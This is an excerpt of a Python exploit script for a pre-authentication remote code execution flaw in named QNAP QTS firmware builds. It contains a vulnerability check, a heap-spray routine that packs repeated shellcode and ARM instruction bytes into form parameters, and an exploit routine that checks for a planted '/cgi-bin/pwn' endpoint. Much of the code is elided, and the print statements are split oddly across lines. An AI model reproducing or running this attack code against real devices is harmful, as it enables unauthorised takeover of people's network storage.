...
def vulnerable(target):
    print
    ">> Checking if likely to be vulnerable"
    ...
    try:
        ...
        print
        "Something wrong: {}".format(sys.exc_info()[0])
        sys.exit()
...
def spray(n):
    spray = ""
    for i in range(n):
        spray += '{}={}&'.format(exploit_data["shellcode"] * 3 + "\x08\x80\xa0\xe1",
                                 exploit_data["shellcode"] * 3 + "\x08\x80\xa0\xe1")
    return spray[:-1]


def exploit(target):
    print
    "Let's " + exploit_data['payload'] + "\n! COULD TAKE A WHILE !"

    if requests.get(target + "/cgi-bin/pwn").status_code == 200:
        print
        "... but first you need to clean up your mess, don't you?"
        sys.exit()
...
if __name__ == "__main__":
    ...
    parser = argparse.ArgumentParser(
        description='Pre-auth Remote Code Execution exploit for QNAP QTS <= 4.2.6 build 20171026, 4.3.3.0378 build 20171117, 4.3.4.0387 (Beta 2) build 20171116')
